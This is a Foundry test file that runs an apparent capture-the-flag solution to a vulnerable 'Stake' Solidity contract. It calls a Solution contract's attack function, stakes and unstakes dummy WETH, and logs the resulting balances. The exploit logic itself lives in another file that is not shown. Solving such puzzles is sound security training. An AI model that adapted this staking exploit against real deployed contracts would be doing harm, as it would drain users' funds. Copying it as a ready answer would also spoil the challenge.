// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";

import "./Stake.sol";
import "./Solution.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract test_solution is Test {
    Stake level;
    Solution solution;
    address player = makeAddr("player");
    ERC20 _dweth;

    function setUp() public {
        _dweth = new ERC20("DummyWETH", "DWETH");
        level = new Stake(address(_dweth));
        solution = new Solution(address(level), address(_dweth));
        vm.deal(player, 1 ether);
    }

    function test_stake() public {
        vm.startPrank(player);
        solution.attack{value: 0.011 ether}();
        _dweth.approve(address(level), type(uint256).max);
        level.StakeWETH(0.01 ether);
        level.Unstake(0.01 ether);
        vm.stopPrank();

        console.log("eth balance of the stake contract : ", address(level).balance);
        console.log("totalstaked in the stake contract : ", level.totalStaked());
        console.log("whether the user is staker or not : ", level.Stakers(player));
        console.log("player's staked value in stake contract : ", level.UserStake(player)); // all conditions satisfied
    }
}
